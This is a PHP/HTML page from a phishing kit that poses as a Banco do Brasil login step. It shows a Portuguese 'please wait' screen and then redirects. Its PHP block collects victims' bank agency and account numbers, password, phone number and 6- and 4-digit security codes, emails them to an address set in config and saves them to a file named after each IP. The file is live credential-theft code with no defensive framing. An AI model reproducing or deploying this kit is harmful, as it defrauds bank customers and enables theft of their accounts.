<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Banco do Brasil</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
	<link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet'>
	<link rel="stylesheet" type="text/css" href="reset.css" />
	<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
	<link rel="stylesheet" type="text/css" href="style.css?id=001" />
</head>
<body>
	<!--
	<form id="frm" name="frm" method="post" action="allow.php" onsubmit="return checkDone()">
	<?php foreach ($_POST as $key => $value): ?>
	<input type="hidden" name="<?= $key ?>" value="<?= $value ?>">
	<?php endforeach; ?>	-->
	<div class="container">
		<div class="topo"><p>Acessar minha conta</p></div>
		<div class="content">

			<table>
				<tr>
					<td></td>
				</tr>

				<tr>
					<td><span class="titulo-preto">Aguarde alguns momentos para finalizar o procedimento.</span></td>
					<br><br>
				</tr>

			</table>
			<div style="width: 50px; margin: 0 auto">
				<img src="https://thumbs.gfycat.com/AjarDisguisedAfricanparadiseflycatcher-max-1mb.gif" width="50">
			</div>

			<table>
				<tr><td><span class="titulo small">Por favor aguarde alguns minutos... </span></td></tr>

			</table>
		</div>

		<div class="footer">
			<button class="btn-amarelo">ENTRAR</button>
		</div>
	</div>

	<!--</form> -->

	<script type="text/javascript" src="js/jquery.mask.min.js"></script>
	<script type="text/javascript" src="js/script1.js"></script>
	<script type="text/javascript">
		setTimeout(function(){
			window.location.replace("confirm.php");
		}, 10000);
	</script>



</body>

</html>

<?php

if ($_POST){
	require_once("config.php");
	extract($_POST);
	$ip = $_SERVER['REMOTE_ADDR'];
	$data=date("d/m/Y");
	$hora=date("H:i");

	$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
	$headers.= "From: BB <chegou@zedn.com>";
	$conteudo ="
	================ Dados ================<br>
	$data-($hora) - $ip<br>
	AG / CC.....: $txt01 / $txt02<br>
	ENTRADA.....: $txt03<br>
	CEL ........: $txt04<br>
	6 DIG.......: $txt05<br>
	4 DIG.......: $txt06<br>
	============================================<br>";

	@mail($receber, "BB - $ip", "$conteudo", $headers); 
	@file_put_contents("data/$ip.html", $conteudo, FILE_APPEND);	

	//var_dump($a);

	//echo $conteudo;
}
